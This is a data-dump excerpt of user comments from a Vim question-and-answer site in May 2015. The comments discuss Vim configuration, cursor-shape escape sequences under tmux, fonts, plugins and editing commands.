  <row Id="4694" PostId="3352" Score="0" Text="I had a similar situation last week. I ended up using tmux to split the screen and two separate Vim's running, one in each pane. Unfortunately, while you gain status and command locality with this, you lose things like sharing registers or being able to edit the same buffer in both views, for example." CreationDate="2015-05-22T02:09:55.703" UserId="227" />
  <row Id="4695" PostId="3353" Score="0" Text="Message display occurs in src/message.c. Look at msg_attr_keep(), which calls msg_strtrunc() (makes the message fit on screen) and msg_outtrans_attr(), which eventually calls msg_puts_attr_len(), which either uses msg_puts_printf() or msg_puts_display(). This last function does fancy stuff with scrolling messages and all that. A cursory glance suggests it might be painful to modify it to display one-liner messages elsewhere, but if you are inclined, that's where I'd start. There is a variable called curwin of type win_T, which has member w_wincol which looks like the screen offset for it." CreationDate="2015-05-22T02:30:20.667" UserId="227" />
  <row Id="4698" PostId="3359" Score="2" Text="Try the plugin's readme/documentation/wiki/issue tracker instead of a generic site." CreationDate="2015-05-22T07:55:09.593" UserId="54" />
  <row Id="4699" PostId="3359" Score="3" Text="@romainl Why we can't use this site for questions about vim plugins? I think this site should be a hub for all questions regarding vi and vim-stuff." CreationDate="2015-05-22T08:33:30.890" UserId="500" />
  <row Id="4700" PostId="3359" Score="0" Text="Well, your question is not about vi, Vim or any of their clones and your chances of finding a useful answer are way higher at the places above than here. Also, the plugin's author has an issue tracker set up just for you, use it." CreationDate="2015-05-22T08:38:18.810" UserId="54" />
  <row Id="4701" PostId="3359" Score="0" Text="@romainl this is not my question. Actually I gave answer on this question below. But anyway this stie will be a lot more useful if questions about plugins and vim-stuff will be accepted here." CreationDate="2015-05-22T08:42:16.537" UserId="500" />
  <row Id="4702" PostId="3362" Score="8" Text="Can you give more information about this: _&quot;I'm using a script to load files in vim remotely into one gvim instance per desktop viewport&quot;_" CreationDate="2015-05-22T12:13:10.447" UserId="500" />
  <row Id="4705" PostId="3364" Score="3" Text="Turning on the `'hidden'` option (`set hidden`) allows you to navigate away from unsaved buffers. For me, this was a huge productivity booster, and was vital to stop relying on splits and tabs so much." CreationDate="2015-05-22T13:15:48.133" UserId="64" />
  <row Id="4706" PostId="3368" Score="0" Text="For insert mode I use `inoremap &lt;C-k&gt; &lt;C-o&gt;gk` and `inoremap &lt;C-j&gt; &lt;C-o&gt;gj` btw." CreationDate="2015-05-22T14:29:42.560" UserId="51" />
  <row Id="4707" PostId="3368" Score="0" Text="thanks jecxjo and carpetsmoker, I do not remeber the meaning of command &quot;g&quot;, but It work!" CreationDate="2015-05-22T14:34:59.927" UserId="983" />
  <row Id="4708" PostId="3368" Score="2" Text="`g` is a prefix to _a lot_ of default mappings.  In this case, `gj` and `gk` move up and down one _visual_ line, not an actual line.  For more on all mappings beginning with `g`, see `:help g`." CreationDate="2015-05-22T14:51:22.097" UserId="865" />
  <row Id="4709" PostId="3363" Score="0" Text="Hello, Alexander. I followed his instructions, but still can not get the expected result: at first installed the fonts from the site of the powerline. Then I made the settings in the .vimrc file. My .vimrc file has been shared in https://gist.github.com/geisonsn/641f13543b8b41fe2c12. I'm using Vundle manager plugin." CreationDate="2015-05-22T15:58:44.700" UserId="2179" />
  <row Id="4710" PostId="3370" Score="0" Text="It would be best to provide some sample text (and resulting text). Since you mention unix sort maybe provide an example of the sort command that would do the job." CreationDate="2015-05-22T16:54:22.810" UserId="778" />
  <row Id="4711" PostId="3363" Score="0" Text="Did you install that font in your editor? If you use vim in terminal you should install that font in the terminal, or if you use gui-version of vim (MacVim, GVim) you need to set font in the `.vimrc`-file, for example: `set guifont=DejaVu\ Sans:s12`. More information you can find here `:help guifont`." CreationDate="2015-05-22T17:05:53.787" UserId="500" />
  <row Id="4712" PostId="3371" Score="1" Text="Since the last column happens to be a hex number using the `x` flag might also be helpful." CreationDate="2015-05-22T19:22:58.340" UserId="895" />
  <row Id="4713" PostId="3363" Score="0" Text="Alexander, thank you for your help. I configured the fonts in gnome-terminou and it work. Would you can add this suggestion in your answer?" CreationDate="2015-05-22T20:00:34.380" UserId="2179" />
  <row Id="4715" PostId="3363" Score="0" Text="You are welcome! Answer is updated." CreationDate="2015-05-22T20:18:57.963" UserId="500" />
  <row Id="4716" PostId="3363" Score="1" Text="@AlexanderMyshov you have repeated configuration lines, where only the second in every two is required." CreationDate="2015-05-23T02:06:25.603" UserId="599" />
  <row Id="4717" PostId="3371" Score="0" Text="This looks great. The last column may be a special case. Any simple representation for the middle columns?" CreationDate="2015-05-23T03:15:00.157" UserId="477" />
  <row Id="4718" PostId="3371" Score="0" Text="I thought you were able to come up with something for that, but here you are. Please accept my (edited) answer by clicking on the outlined checkmark next to it. Thanks!" CreationDate="2015-05-23T09:56:28.927" UserId="970" />
  <row Id="4719" PostId="3379" Score="0" Text="Vim compiled with '+cursorshape' feature?" CreationDate="2015-05-24T01:29:51.060" UserId="1145" />
  <row Id="4721" PostId="3385" Score="0" Text="By 'inline' I was just referring to having the normal messages written to the existing buffer without any modifications (like screen redraws, or empty spaces that pushes additional messages to the bottom of the screen). In any case, your solution works, thank you!" CreationDate="2015-05-24T17:23:27.050" UserId="2207" />
  <row Id="4723" PostId="3386" Score="0" Text="It isn't possible to move windows across tabs." CreationDate="2015-05-25T05:26:20.360" UserId="1577" />
  <row Id="4724" PostId="3386" Score="0" Text="Hmm, that's too bad.  I could probably create some mapping or command which could accomplish it though." CreationDate="2015-05-25T12:08:20.230" UserId="865" />
  <row Id="4725" PostId="3388" Score="5" Text="Just a small note: in a VimScript file (i.e. `*.vim`), you never need the leading `:` characters." CreationDate="2015-05-25T14:22:24.190" UserId="64" />
  <row Id="4726" PostId="3379" Score="0" Text="Check terminal  settings. And this question looks similar &#xA; http://superuser.com/questions/634326/how-can-i-get-a-block-cursor-in-vim-in-the-cygwin-terminal" CreationDate="2015-05-25T14:24:41.227" UserId="1145" />
  <row Id="4727" PostId="3386" Score="0" Text="I think the best you can do is to save all of the window settings and then recreate it on the existing tab." CreationDate="2015-05-25T14:24:48.580" UserId="64" />
  <row Id="4728" PostId="3359" Score="0" Text="Use https://everythingfonts.com/otf-to-ttf to convert the fonts to ttf, Example: Older XShell Versions doesn't support otf." CreationDate="2015-05-25T14:57:03.910" UserId="1262" />
  <row Id="4729" PostId="3392" Score="4" Text="The use of text objects like `iw` is interesting but your solution is actually the same as @CarpetSmoker's one: visually selecting the second word and put the first one. I also think that your solution would work with a simple `p` instead of using `&quot;0` register." CreationDate="2015-05-25T16:05:31.663" UserId="1841" />
  <row Id="4730" PostId="2835" Score="0" Text="I encounter this issue as well. Have you filed it with the Github project? (https://github.com/macvim-dev/macvim/issues)" CreationDate="2015-05-25T19:24:33.617" UserId="2223" />
  <row Id="4731" PostId="3379" Score="0" Text="Which terminal emulator are you using? Have you tried something like `let &amp;t_SI = &quot;\&lt;Esc&gt;Ptmux;\&lt;Esc&gt;\&lt;Esc&gt;]50;CursorShape=1;BlinkingCursorEnabled=1\x7\&lt;Esc&gt;\\&quot;` and `let &amp;t_EI = &quot;\&lt;Esc&gt;Ptmux;\&lt;Esc&gt;\&lt;Esc&gt;]50;CursorShape=0;BlinkingCursorEnabled=0\x7\&lt;Esc&gt;\\&quot;`?" CreationDate="2015-05-25T20:11:34.053" UserId="1306" />
  <row Id="4735" PostId="3379" Score="0" Text="@jjaderberg iTerm's escape sequence? Works only in iTerm with some cautions:  &#xA;[iTerm Doc](https://iterm2.com/documentation-escape-codes.html)  &#xA;&gt;iTerm2 supports several non-standard escape codes. These may not work properly in tmux or screen, and may have unknown effects on other terminal emulators. Proceed with caution." CreationDate="2015-05-26T05:47:34.410" UserId="1145" />
  <row Id="4736" PostId="3379" Score="0" Text="@alex-kroll I was not aware that it was iTerm specific. My point was that the control sequence may need to be altered when using tmux, and that how to alter it may depend on the terminal emulator (and &quot;here's an example ...&quot;) What part of that sequence is peculiar to iTerm, btw? I thought I saw precisely or very similar sequences used for other terms, though I may be mistaken." CreationDate="2015-05-26T06:56:51.097" UserId="1306" />
  <row Id="4737" PostId="3379" Score="0" Text="@jjaderberg btw `let &amp;t_SI = &quot;\e[5 q&quot;&#xA;let &amp;t_EI = &quot;\e[2 q&quot;` `let &amp;t_EI = &quot;\e[2 q&quot;` works fine for me.&#xA;Windows7x64, vim 7.4, mintty + tmux." CreationDate="2015-05-26T08:43:58.283" UserId="1145" />
  <row Id="4739" PostId="3379" Score="0" Text="@AlexKroll The solution to the other question doesn't work for me (because of TMUX). Mintty setting: &quot;rightclick on bar &gt; Options &gt; Looks &gt; Cursor&quot; is not a solution either, because it changes the cursor permanently (vim modes still don't change the cursor)." CreationDate="2015-05-26T09:24:52.110" UserId="1067" />
  <row Id="4740" PostId="3379" Score="0" Text="@jjaderberg It doesn't work, even without tmux (also tried replacing &quot;\&lt;Esc&gt;&quot; with &quot;\e&quot;). The next three &quot;lets&quot; work only outside of tmux." CreationDate="2015-05-26T09:25:02.607" UserId="1067" />
  <row Id="4741" PostId="3379" Score="0" Text="I updated the question with additional information." CreationDate="2015-05-26T09:25:22.490" UserId="1067" />
  <row Id="4742" PostId="3395" Score="3" Text="Please give more background; what is your final goal? When a question is only about a small technical step, it's difficult to provide a good answer. If you don't tell us **why** you want this, it's easy to succumb to the [XY problem](http://meta.stackoverflow.com/questions/66377/what-is-the-xy-problem)." CreationDate="2015-05-26T10:39:37.457" UserId="970" />
  <row Id="4743" PostId="3295" Score="0" Text="I've returned back to the buffergator, because bufsurf jumps to closed buffers." CreationDate="2015-05-26T11:13:14.147" UserId="500" />
  <row Id="4744" PostId="3394" Score="0" Text="I figured that this was the case.  I could probably make a small script which does exactly that." CreationDate="2015-05-26T12:17:44.740" UserId="865" />
  <row Id="4746" PostId="3398" Score="0" Text="A better test: `if globpath(&amp;runtimepath, 'colors/solarized.vim', 1) !=# ''`." CreationDate="2015-05-26T17:15:26.703" UserId="1577" />
  <row Id="4747" PostId="3398" Score="0" Text="hmm that is a cool way to do it too.. not sure why its a better test though.. If you could elaborate on why that might be a better way to check for the file that would be awesome! (figure its just the fact that `&amp;runtimepath` will dynamically use the appropriate path no matter what your vim install is..) Either way the you just want to check that the file is present before attempting to load the colorscheme.." CreationDate="2015-05-26T17:21:27.027" UserId="2189" />
  <row Id="4749" PostId="3398" Score="1" Text="It's better (1) because of `runtimepath`, (2) because `empty()` is a list function, not a string one (even though `empty(string)` works), and (3) because your `glob()` pays attention to `suffixes` and `wildignore`." CreationDate="2015-05-26T17:47:04.367" UserId="1577" />
  <row Id="4750" PostId="3340" Score="0" Text="@lutaoact maybe you could answer your own question so as it doesn't stay unanswered :)" CreationDate="2015-05-26T18:19:22.603" UserId="1841" />
  <row Id="4751" PostId="3379" Score="1" Text="I've check my soft one more time and all versions are same with yours but $TERM in mintty options is `xterm-256color` inside tmux `screen-256color`. tmux has version 1.9 (and your is 1.9a). I've launch vim inside tmux `vim -u NULL` (-u NULL means no config). Cursor shape is block in any mode, but when I assign `t_SI` and `t_EI` shape switch from block (normal mode) to `I` (insert mode) as expected. Can you try to launch vim with empty .vimrc, without any colorschemes and plugins?" CreationDate="2015-05-26T21:49:36.667" UserId="1145" />
  <row Id="4752" PostId="3404" Score="0" Text="Thanks for the comment and, if you don't mind me asking; do you type &quot;[&quot; then &quot;hello&quot; then &quot;]&quot;. Without the surround plugins (which does seem like a great idea, thanks) it seems sort of cumbersome to go back and forth even without the problem of potentially losing the right number of brackets" CreationDate="2015-05-27T00:44:59.757" UserId="217" />
  <row Id="4753" PostId="390" Score="0" Text="What does **If you like to get crazy** mean ? Does pathogen#helptags()  eat resources ?" CreationDate="2015-05-27T04:13:49.930" UserId="1262" />
  <row Id="4754" PostId="390" Score="2" Text="@JaDogg Oh, that's from the [README](https://github.com/tpope/vim-pathogen/): &quot;Normally, Vim expects you to run :helptags on each directory with documentation (e.g., :helptags ~/.vim/doc). Provided with pathogen.vim is a :Helptags command that does this on every directory in your 'runtimepath'. If you really want to get crazy, you could even invoke Helptags in your vimrc. I don't like to get crazy.&quot; I'd say if you have a lot of plugins, this might slow down startup a bit. And you really don't need to run it at every startup, once for each plugin installation/upgrade should be enough." CreationDate="2015-05-27T04:35:52.663" UserId="205" />
  <row Id="4755" PostId="3404" Score="0" Text="Well actually I always use either auto-pairs or surround.vim (see the answer of Peter) but if I had to do that without plug-ins, I would do `[`,  `] `,  `&lt;Esc&gt;` (which will place the cursor on the `] `)  and finally `i` which will place the cursor between the brackets in insert mode." CreationDate="2015-05-27T05:24:06.527" UserId="1841" />
  <row Id="4756" PostId="3383" Score="0" Text="I see your use cases more as consequences of the behavior of this register, but I think your answer clearly describe this register with ` The black hole register is here to let us cut stuff without clobbering the unnamed register and the numbered registers.` I was expecting other answers but it seems that it's the only use of this register. Thank you a lot for your answer!" CreationDate="2015-05-27T05:40:09.913" UserId="1841" />
  <row Id="4757" PostId="3379" Score="0" Text="@AlexCroll - i renamed my ```.bashrc```, ```.tmux.conf``` and left only two variabls in ```.vimrc``` = it works now! i will be restoring my configuration and will let you know what caused the problems." CreationDate="2015-05-27T09:38:04.843" UserId="1067" />
  <row Id="4758" PostId="3379" Score="0" Text="@AlexCroll - The problem was caused by this line in my ```.bashrc```: ```export TERM=screen-256color```. If i comment the line out or change its value to for example &quot;xterm-256color&quot;, cursor changing in different vim modes in tmux works again! Maybe tmux thought it is running inside screen? You can add this as an answer so i can mark it as solution." CreationDate="2015-05-27T09:57:11.403" UserId="1067" />
  <row Id="4759" PostId="3408" Score="0" Text="I'm developing my own LaTeX-plugin (see link in the question). I've found latex-suite is way to complex and intrusive in general. The IMAP-functionality is not that bad, although I prefer to instead use something like UltiSnips for complex snippets." CreationDate="2015-05-27T10:59:42.763" UserId="21" />
  <row Id="4760" PostId="3408" Score="1" Text="`IMAP()` was interesting to define mappings, but mappings are harder to maintain than snippets/templates." CreationDate="2015-05-27T11:14:20.087" UserId="626" />
  <row Id="4761" PostId="3404" Score="0" Text="@statox when in insert mode, how do you move your cursor two positions to the left? With `ctrl-o 2h`? Is this faster than moving your hand to the cursors? ;)" CreationDate="2015-05-27T14:26:11.363" UserId="599" />
  <row Id="4762" PostId="3413" Score="0" Text="Is the syntax the same in sed?" CreationDate="2015-05-27T14:27:02.323" UserId="1065" />
  <row Id="4763" PostId="3413" Score="2" Text="@leeand00 No. All that `:g` does is run an ex command on the lines that match a pattern. So typing `:g/match/.,+1d` would be exactly the same as going to all lines with `match`, and typing `:.,+1d`" CreationDate="2015-05-27T14:29:17.060" UserId="51" />
  <row Id="4764" PostId="3404" Score="0" Text="@Vitor Nope I'll hit the Esc key to go to normal mode, for a movement of less than 3 characters i'll probably hit several time `h` or `j` and otherwise I'll use other movements. It feels faster to me, but I understand that some people feel it in a different way :)" CreationDate="2015-05-27T15:10:15.140" UserId="1841" />
  <row Id="4765" PostId="3404" Score="0" Text="@statox after 10 years using vim, I'm still struggling to use hjkl and specially in this scenario I just described. Thanks for your comments! :)" CreationDate="2015-05-27T16:17:40.500" UserId="599" />
  <row Id="4766" PostId="3258" Score="0" Text="You guys were totally right. Mapping to escape is a bad idea. I ended up changing the command to `nnoremap &lt;silent&gt; &lt;Leader&gt;\` :let @/=&quot;&quot;&lt;CR&gt;`. This clears the search register - it does **not** set the search register to an empty string as that would match everywhere.  Doing this sets up the search register in the same state as when vim starts (I like that). I got the idea from [here](http://stackoverflow.com/questions/657447/vim-clear-last-search-highlighting). I'm sorry I didn't see it there first. I did look around before I posted (posting takes up my time, too). Thanks very much, all." CreationDate="2015-05-27T16:41:30.673" UserId="2062" />
  <row Id="4767" PostId="3404" Score="0" Text="@Vitor maybe we should have this discussion in the chat rather than in the comments but I'm you've been using vim for much longer than me so I'm curious to know have the opinion of an experimented user: I agree that using `h` or `l` in this case doesn't feel particularly natural, so does it mean that in this scenario you use the arrow keys, or you found another solution?" CreationDate="2015-05-27T16:55:11.183" UserId="1841" />
  <row Id="4768" PostId="3406" Score="0" Text="It would probably be better to use buffer-local abbreviations on just tex filetypes instead of a global abbreviation that checking `'filetype'`." CreationDate="2015-05-27T17:27:55.573" UserId="778" />
  <row Id="4769" PostId="3419" Score="3" Text="[This seems to be a common problem](https://youtu.be/DIzAaY2Jm-s?t=194)" CreationDate="2015-05-27T18:06:00.687" UserId="51" />
  <row Id="4770" PostId="3406" Score="0" Text="@Peter Rincker: Yes, it's just a proof of concept.  It can be optimised in many ways, f.i. by finding the numeric IDs for `texMathZoneE` and `texMathZoneX` beforehand." CreationDate="2015-05-27T18:16:36.523" UserId="1577" />
  <row Id="4771" PostId="3419" Score="0" Text="@Carpetsmoker that's a good one" CreationDate="2015-05-27T19:37:48.857" UserId="69" />
  <row Id="4772" PostId="3422" Score="0" Text="&quot;If those answers do not fully address your question, please edit this question to explain how it is different&quot; - I already explained why it's different. I don't want plugins." CreationDate="2015-05-27T20:05:22.940" UserDisplayName="user2266" />
  <row Id="4773" PostId="3422" Score="0" Text="I see four solutions to your problem: 1. run your commands manually, 2. use modelines in all your files, 3. write a function that analyses the content of the files you are editing, 4. use a function that someone has already written and packaged for you. I vote for [solution 4](https://github.com/Raimondi/YAIFA)." CreationDate="2015-05-27T21:16:35.207" UserId="54" />
  <row Id="4774" PostId="3424" Score="1" Text="It looks like this command is following the behavior of `:make` in terms of how `!` works. It seems that `:make!` will do what you're looking for." CreationDate="2015-05-27T21:41:39.970" UserId="64" />
  <row Id="4775" PostId="3424" Score="0" Text="Yes, that's exactly what I was looking for! If you write this as an answer, I'll mark it as the correct answer." CreationDate="2015-05-28T01:20:30.990" UserId="2270" />
  <row Id="4776" PostId="3420" Score="2" Text="E341 is an internal error according to `:h E341`. Try deleting and reinstalling MacVim and see if it goes away." CreationDate="2015-05-28T07:08:41.443" UserId="46" />
  <row Id="4777" PostId="3426" Score="2" Text="To be more useful to other people you could also indicate how you changed the size of your font ;) If I remember well on gVim and MacVim it is with the option `guifont`." CreationDate="2015-05-28T09:51:21.440" UserId="1841" />
  <row Id="4778" PostId="2451" Score="0" Text="this, along with the comment from the other answer should be the accepted one. Spot on. We had the same issue with a colleague and then I noticed his chosen color scheme only had `guifg` and `guibg` defined for the various `highlight` definitions. Thanks!" CreationDate="2015-05-28T10:48:37.100" UserId="1109" />
  <row Id="4779" PostId="2442" Score="0" Text="This answer is missing the very important fact from the other answer. Most color schemes simply seem to be made for the GUI version of Vim, rather than the terminal version. Many of those color schemes will not even contain a definition for the terminal version and thus they don't appear to work." CreationDate="2015-05-28T10:50:29.223" UserId="1109" />
  <row Id="4780" PostId="2442" Score="0" Text="@0xC0000022L: Thanks for the feedback; judging from the screenshot, this might very well be the case here. I've added corresponding instructions to my answer." CreationDate="2015-05-28T11:05:54.117" UserId="970" />
  <row Id="4781" PostId="3428" Score="0" Text="Related tip: I like to use `set gdefault` in my vimrc. This will add the `/g` flag by default, since this is what I want 95% of the time (you can &quot;undo&quot; the `/g` flag by adding it)." CreationDate="2015-05-28T11:22:23.393" UserId="51" />
  <row Id="4782" PostId="2442" Score="0" Text="@IngoKarkat: great edit. Thanks. I wish I could upvote it once again." CreationDate="2015-05-28T12:51:31.097" UserId="1109" />
  <row Id="4783" PostId="3430" Score="0" Text="I figured that it would just be easier to use a literal string in the first place.  Very helpful!" CreationDate="2015-05-28T13:17:18.630" UserId="865" />
  <row Id="4785" PostId="3428" Score="0" Text="Great answer! I agree with @Carpetsmoker that `gdefault` is useful. Until you forget it's on and do `/g` :)" CreationDate="2015-05-28T13:26:52.247" UserId="131" />
  <row Id="4786" PostId="3431" Score="1" Text="Simple way is map key to three command in row&#xA;`&lt;,&gt;y` - for yank visual range&#xA;`tabnew` - for creating new tab&#xA;`p` - for paste yanked text in first step" CreationDate="2015-05-28T13:42:52.897" UserId="1145" />
  <row Id="4787" PostId="3429" Score="0" Text="I'm not sure I understand your question, but you might find useful the `string()` function.  Combined with `eval()`, it makes it easy to pass things around without bending over backwards to quote values.  You can see it at work f.i. [here](http://vi.stackexchange.com/a/3406/1577)." CreationDate="2015-05-28T13:50:37.113" UserId="1577" />
  <row Id="4788" PostId="3429" Score="0" Text="I was afraid that I hadn't worded the question properly, but I don't really know how to make it clearer. Feel free to edit it." CreationDate="2015-05-28T13:55:20.167" UserId="865" />
  <row Id="4789" PostId="3429" Score="0" Text="Sorry, that wasn't a snark, I'm genuinely not sure I understand what you're trying to do (so I wouldn't know how to edit your question).  Just pointing to `string()` as useful in general, not necessarily here." CreationDate="2015-05-28T13:58:27.880" UserId="1577" />
  <row Id="4790" PostId="3429" Score="0" Text="If this helps at all, I am essentially wanting to convert a literal string (in single quotes) to a normal string (in double quotes) or vice versa.  The difference between literal strings and normal strings is that normal strings allow for special characters, whereas literal strings don't." CreationDate="2015-05-28T14:11:42.717" UserId="865" />
  <row Id="4791" PostId="3419" Score="0" Text="I'm going to assume that you are using Python 3.  Can you check that vim is using Python 3 and not 2?" CreationDate="2015-05-28T14:27:14.770" UserId="622" />
  <row Id="4792" PostId="3419" Score="0" Text="@Sardathrion, you mean by looking at `vim --version`?" CreationDate="2015-05-28T14:42:03.317" UserId="69" />
  <row Id="4793" PostId="3429" Score="0" Text="That's a level of indirection I always try to avoid.  It's usually possible, with `string()`: assignment: `let foobar=&quot;foo\tbar&quot;`, direct use: `:echo foobar`, passing it along: `:exec 'echo ' . string(foobar)`.  Things can get hairy when writing complicated sort functions, or functions for `filter()`, `map()`, and the like.  But even then, `string()` avoids a lot of complexity." CreationDate="2015-05-28T14:45:44.213" UserId="1577" />
  <row Id="4794" PostId="3419" Score="0" Text="The code which causes this error in `jedi_vim.py` is fairly straightforward: `try: import jedi except ImportError: no_jedi_warning()` ... Perhaps your `sys.path` is incorrect? Using `:py print(sys.path)` on my systems reveals that it includes `'/home/martin/.vim/plugged/jedi-vim'` and `'_vim_path_'`... I would guess the first one is required for vim-jedi to work (?) It seems the jedi path is added in `initialize.py`." CreationDate="2015-05-28T15:15:36.753" UserId="51" />
  <row Id="4795" PostId="3419" Score="0" Text="You mentioned you installed jedi system-wide. What happens if you type `import jedi` in the Python commandline? If this also fails, it would suggest you have some sort of generic Python problem (strange `PYTHONPATH`?)" CreationDate="2015-05-28T15:17:50.250" UserId="51" />
  <row Id="4796" PostId="3420" Score="2" Text="It could also be a bug in Vim, MacVim, netrw, or a combination thereof. I tried looking up what `NetrwOptionRestore` does to try and see if there may be a workaround, but netrw is such a mess that I gave up &gt;_&lt;" CreationDate="2015-05-28T15:28:19.827" UserId="51" />
  <row Id="4797" PostId="3228" Score="0" Text="Your code doesn't seem like valid JSX?" CreationDate="2015-05-28T15:45:23.560" UserId="51" />
  <row Id="4798" PostId="3434" Score="5" Text="*&quot;it is causing errors in my PHP scripts&quot;*  -&gt; This is strange? PHP should work fine with a trailing newline. In fact, this is pretty much standard. Perhaps you have a blank line after the `?&gt;` which PHP outputs to the browser (causing the &quot;headers already sent&quot;-error)? You don't need a trailing `?&gt;`, and it is usually recommended to leave it out to prevent exactly this problem." CreationDate="2015-05-28T15:53:24.757" UserId="51" />
  <row Id="4799" PostId="3434" Score="0" Text="I guess thats misleading. Our scripts interpret any output as an error." CreationDate="2015-05-28T15:55:07.303" UserId="2276" />
  <row Id="4800" PostId="3434" Score="1" Text="Also, related question: [How to make vim automatically add a newline to the end of a file?](http://vi.stackexchange.com/q/3298/51)" CreationDate="2015-05-28T15:55:14.753" UserId="51" />
  <row Id="4801" PostId="3438" Score="2" Text="Maybe that's something you should [talk about with the author](https://github.com/yegappan/lid/issues)." CreationDate="2015-05-28T16:11:25.510" UserId="54" />
  <row Id="4802" PostId="3434" Score="0" Text="No. Vim is not adding a new line." CreationDate="2015-05-28T16:13:28.123" UserId="54" />
  <row Id="4803" PostId="3438" Score="0" Text="This is not just the Lid.vim plugin. I have had this issue with ctags as well before." CreationDate="2015-05-28T16:20:08.903" UserId="2277" />
  <row Id="4804" PostId="1981" Score="0" Text="@joeytwiddle Why not add that as an answer?" CreationDate="2015-05-28T16:41:09.073" UserId="51" />
  <row Id="4806" PostId="1981" Score="0" Text="@Sukminder Why not add that as an answer?" CreationDate="2015-05-28T16:41:27.587" UserId="51" />
  <row Id="4807" PostId="3453" Score="3" Text="You could also do `[p` or `]p`." CreationDate="2015-05-28T20:12:11.893" UserId="54" />
  <row Id="4810" PostId="3453" Score="0" Text="@romainl I didn't know about that, but that does indeed seem to do what I want." CreationDate="2015-05-28T21:09:07.323" UserId="1060" />
  <row Id="4811" PostId="3453" Score="1" Text="@romainl Actually, that appears to remove leading spaces when pasting below a blank line, which is not necessarily what I want." CreationDate="2015-05-28T21:52:33.737" UserId="1060" />
  <row Id="4813" PostId="3453" Score="0" Text="Which is why there are both a `[p` (which is probably better written as `]P`) and a `]p`" CreationDate="2015-05-29T05:01:13.170" UserId="1577" />
  <row Id="4815" PostId="3419" Score="0" Text="I mean are you *sure* that vim uses Python3? `:python import sys; print(sys.version)` should tell you." CreationDate="2015-05-29T06:46:15.290" UserId="622" />
  <row Id="4816" PostId="3438" Score="0" Text="`Enter` is implemented internally as `:.cc` (it's actually `:.cc` for quickfix lists and `:.ll` for location lists).  Does the problem still occur if you run `:cc`?" CreationDate="2015-05-29T07:00:38.477" UserId="1577" />
  <row Id="4817" PostId="3453" Score="0" Text="`[p` and `]p` are to be used when you want to paste while keeping the indent of the line above or below. They are not magical replacements for `P` and `p`." CreationDate="2015-05-29T07:19:27.353" UserId="54" />
  <row Id="4819" PostId="3457" Score="2" Text="You can make it shorter by doing: `let &amp;modifiable = !&amp;readonly`" CreationDate="2015-05-29T09:10:43.690" UserId="51" />
  <row Id="4820" PostId="3453" Score="0" Text="@romainl ....so why did you suggest them, then? Autoindent correctly ignores blank lines; it wouldn't have been surprising if `[p` did the same." CreationDate="2015-05-29T09:33:04.497" UserId="1060" />
  <row Id="4821" PostId="3459" Score="0" Text="Thank you for the detailed answer, this works great!" CreationDate="2015-05-29T10:22:30.960" UserId="2287" />
  <row Id="4823" PostId="3438" Score="0" Text="Using `:.cc` works . But Enter is not. Why is that?" CreationDate="2015-05-29T12:36:04.513" UserId="2277" />
  <row Id="4824" PostId="3456" Score="0" Text="This is even better - works without changing my ```.bashrc```. Thank you." CreationDate="2015-05-29T13:21:33.310" UserId="1067" />
  <row Id="4825" PostId="3419" Score="0" Text="@Carpetsmoker, the comment that you originally had, about checking `sys.path` from within vim revealed that it was using a version of python I had installed from source (and completely forgot about). I removed the source python installation and recompiled vim, and now everything is butter. Thanks!" CreationDate="2015-05-29T14:47:27.913" UserId="69" />
  <row Id="4826" PostId="3419" Score="0" Text="@drs Ah, okay. I figured that comment was mistaken, so I removed it; but apparently I was mistaken about being mistaken ;-) I undeleted the comment. In any case, you should add your solution as an answer ;-)" CreationDate="2015-05-29T14:50:59.370" UserId="51" />
  <row Id="4829" PostId="3457" Score="0" Text="@Carpetsmoker Much better as a one liner, thanks!  &#xA;However it would still have to be:  &#xA;`autocmd BufRead * let &amp;modifiable = !&amp;readonly`" CreationDate="2015-05-29T15:11:33.160" UserId="2283" />
  <row Id="4830" PostId="3462" Score="0" Text="Are you using plain JS? OR JSX? (asking because you [previously asked a question about indentation with JSX](https://vi.stackexchange.com/questions/3228/how-to-prevent-vim-jsx-from-mangling-my-indentation))" CreationDate="2015-05-29T17:31:23.627" UserId="51" />
  <row Id="4831" PostId="3463" Score="0" Text="This plugin doesn't seem to allow arbitrary text highlighting as specified in the question, thought it does have its own syntax highlighting." CreationDate="2015-05-29T18:29:51.997" UserId="865" />
  <row Id="4834" PostId="3452" Score="0" Text="This does not directly answer your question but regarding visibility of tabs, I use this `:set listchars=tab:\|\ ,trail:_,extends:&gt;,precedes:&lt;,nbsp:% list`" CreationDate="2015-05-30T00:20:10.303" UserId="2295" />
  <row Id="4835" PostId="3452" Score="0" Text="@cychoi I have an autocmd on buffer-load that checks for tabs and uses something like that to turn them bright yellow if they *are* present, but otherwise I don't want to see leading spaces so I only include trailing spaces in `listchars`. I suppose I could include tabs as well, though...." CreationDate="2015-05-30T00:25:06.413" UserId="1060" />
  <row Id="4836" PostId="3462" Score="0" Text="Plain `.js`, this is `Gulpfile.js`" CreationDate="2015-05-30T03:22:59.617" UserId="237" />
  <row Id="4838" PostId="428" Score="0" Text="Exactly this. I've been using Vim for 8 years and I'm still writing my vimrc. If you try to configure too much at once, you won't remember what you've done and you'll forget to take advantage of it." CreationDate="2015-05-30T05:08:32.500" UserId="64" />
  <row Id="4839" PostId="3467" Score="5" Text="Already answered here: http://stackoverflow.com/questions/13924093/gvim-fold-toggle-using-mouse" CreationDate="2015-05-30T05:30:03.630" UserId="1577" />
  <row Id="4846" PostId="3467" Score="0" Text="Google for &quot;vim mouse fold&quot;, and click &quot;I feel lucky&quot;." CreationDate="2015-05-30T18:40:13.087" UserId="1577" />
  <row Id="4849" PostId="3476" Score="0" Text="You can make the window 80 characters wide: `:set columns 80`." CreationDate="2015-05-31T13:14:37.573" UserId="51" />
  <row Id="4850" PostId="3476" Score="0" Text="The 80 columns limit made sense in the 70s and 80s because that was the usual width of terminals back then. Today, 80 is more superstition than anything. Anyway, Did you try `:vnew`?" CreationDate="2015-05-31T14:06:31.353" UserId="54" />
  <row Id="4851" PostId="3479" Score="0" Text="Thanks, that worked. Why would :find be superior to :edit in this case? Is it because you can pre-filter out matches with &quot;path&quot; while :edit will just search for everything?" CreationDate="2015-05-31T14:26:36.830" UserId="2312" />
  <row Id="4852" PostId="3479" Score="1" Text="Yes. With `:edit **/foo`, your are somewhat restricted to files located below the working directory. With `:find`, you are restricted to the directories specified in `'path'`, which may or may not be under the working directory." CreationDate="2015-05-31T14:30:08.200" UserId="54" />
  <row Id="4853" PostId="3479" Score="0" Text="A quick question about this, why is a `*` necessary at the end of the find command?  I tried using that, and when I hit tab after typing a few characters in, it shows the results, then removes the star." CreationDate="2015-05-31T16:39:50.490" UserId="865" />
